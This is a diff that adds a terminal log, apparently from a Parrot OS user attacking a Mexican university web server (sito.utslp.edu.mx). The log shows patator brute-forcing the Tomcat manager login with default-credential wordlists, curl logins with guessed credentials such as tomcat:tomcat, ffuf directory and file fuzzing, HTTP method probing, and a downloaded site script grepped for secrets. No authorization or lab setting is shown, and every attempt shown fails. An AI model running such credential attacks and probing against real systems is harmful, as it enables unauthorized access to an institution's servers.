@@ -1,0 +1,221 @@
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k "https://sito.utslp.edu.mx/styles2/"
+        ERROR 404
+        
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $wget -r -l 1 -A.css https://sito.utslp.edu.mx/styles2/
+--2025-10-08 18:57:37--  https://sito.utslp.edu.mx/styles2/
+Resolviendo sito.utslp.edu.mx (sito.utslp.edu.mx)... 189.254.143.102
+Conectando con sito.utslp.edu.mx (sito.utslp.edu.mx)[189.254.143.102]:443... falló: No existe ninguna ruta hasta el `host'.
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=tomcat6_users.txt 1=tomcat6_pass.txt -x ignore:code=401
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+18:58:39 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 18:58 CST
+18:58:40 patator    INFO -                                                                              
+18:58:40 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+18:58:40 patator    INFO - -----------------------------------------------------------------------------
+18:58:44 patator    INFO - Hits/Done/Skip/Fail/Size: 0/96/0/0/96, Avg: 21 r/s, Time: 0h 0m 4s
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $curl -k -X HEAD -u "tomcat:tomcat" "https://sito.utslp.edu.mx/manager/html" -I
+HTTP/1.1 401 No Autorizado
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Wed, 31 Dec 1969 18:00:00 CST
+WWW-Authenticate: Basic realm="Tomcat Manager Application"
+Content-Type: text/html
+Transfer-Encoding: chunked
+Date: Thu, 09 Oct 2025 00:59:02 GMT
+
+
+curl -k -u "admin:" "https://sito.utslp.edu.mx/manager/html" -I
+curl -k -u ":tomcat" "https://sito.utslp.edu.mx/manager/html" -I
+curl -k -u "both:tomcat" "https://sito.utslp.edu.mx/manager/html" -I
+
+    404
+    
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $strings error404.png | grep -i -E "password|user|jdbc"
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $ffuf -u "https://sito.utslp.edu.mx/images/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .png,.jpg,.gif -mc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://sito.utslp.edu.mx/images/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .png .jpg .gif 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+banner2.jpg             [Status: 200, Size: 11101, Words: 32, Lines: 59, Duration: 81ms]
+banner2.png             [Status: 200, Size: 344245, Words: 1223, Lines: 1091, Duration: 64ms]
+bottom.gif              [Status: 200, Size: 909, Words: 3, Lines: 2, Duration: 79ms]
+error404.png            [Status: 200, Size: 4784, Words: 36, Lines: 19, Duration: 59ms]
+exit.png                [Status: 200, Size: 1657, Words: 9, Lines: 5, Duration: 77ms]
+exit.jpg                [Status: 200, Size: 9055, Words: 2036, Lines: 32, Duration: 80ms]
+logoff.png              [Status: 200, Size: 30939, Words: 165, Lines: 126, Duration: 82ms]
+logo.jpg                [Status: 200, Size: 66442, Words: 416, Lines: 239, Duration: 74ms]
+pdf.png                 [Status: 200, Size: 3197, Words: 16, Lines: 14, Duration: 61ms]
+pixel.gif               [Status: 200, Size: 43, Words: 1, Lines: 2, Duration: 69ms]
+play.png                [Status: 200, Size: 49451, Words: 12159, Lines: 234, Duration: 73ms]
+profile.png             [Status: 200, Size: 102632, Words: 305, Lines: 254, Duration: 136ms]
+save.png                [Status: 200, Size: 2231, Words: 12, Lines: 7, Duration: 65ms]
+stop.png                [Status: 200, Size: 48856, Words: 12154, Lines: 246, Duration: 81ms]
+Thumbs.db               [Status: 200, Size: 5878784, Words: 0, Lines: 0, Duration: 0ms]
+tomcat.gif              [Status: 200, Size: 7, Words: 1, Lines: 1, Duration: 75ms]
+:: Progress: [18456/18456] :: Job [1/1] :: 86 req/sec :: Duration: [0:01:00] :: Errors: 5985 ::
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -X GET "https://sito.utslp.edu.mx/manager/html"
+curl: (7) Failed to connect to sito.utslp.edu.mx port 443 after 35 ms: Could not connect to server
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -X POST "https://sito.utslp.edu.mx/manager/html" 
+curl: (7) Failed to connect to sito.utslp.edu.mx port 443 after 39 ms: Could not connect to server
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -X PUT "https://sito.utslp.edu.mx/manager/html"
+curl: (7) Failed to connect to sito.utslp.edu.mx port 443 after 36 ms: Could not connect to server
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -X DELETE "https://sito.utslp.edu.mx/manager/html"
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 6.0.30 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>The deprecated <tt>manager</tt> role should not be assigned to any
+        user.</li>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
+   </p>
+ </body>
+
+</html>┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -X TRACE "https://sito.utslp.edu.mx/manager/html"
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+
+
+Testing user: admin
+Response: HTTP/1.1 401 No Autorizado
+Testing user: manager
+Response: HTTP/1.1 401 No Autorizado
+Testing user: tomcat
+Response: HTTP/1.1 401 No Autorizado
+Testing user: role1
+Response: HTTP/1.1 401 No Autorizado
+Testing user: both
+Response: HTTP/1.1 401 No Autorizado
+Testing user: root
+Response: HTTP/1.1 401 No Autorizado
+Testing user: server
+Response: HTTP/1.1 401 No Autorizado
+Testing user: administer
+Response: HTTP/1.1 401 No Autorizado
+
+ :: URL              : https://sito.utslp.edu.mx/FUZZ
+ :: Wordlist         : FUZZ: /home/marcos_os/Desktop/ProyectoSito/NuevoComienzo/wgets/tomcat_config_paths.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+:: Progress: [9/9] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $curl -k "https://sito.utslp.edu.mx/javascript/utilities.js" -o backdoor_analysis.js
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7813  100  7813    0     0  21900      0 --:--:-- --:--:-- --:--:-- 21946
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -i -E "mysql|jdbc|connection|database|execute|query" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -oE "https?://[^\"]+" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -oE "/[a-zA-Z0-9_/-]+" backdoor_analysis.js | sort -u
+/-
+/i
+
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .war .jar 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+                        [Status: 200, Size: 15938, Words: 1656, Lines: 541, Duration: 64ms]
+Thumbs.db               [Status: 200, Size: 154624, Words: 479, Lines: 658, Duration: 63ms]
+:: Progress: [13842/13842] :: Job [1/1] :: 28 req/sec :: Duration: [0:00:55] :: Errors: 4378 ::
+
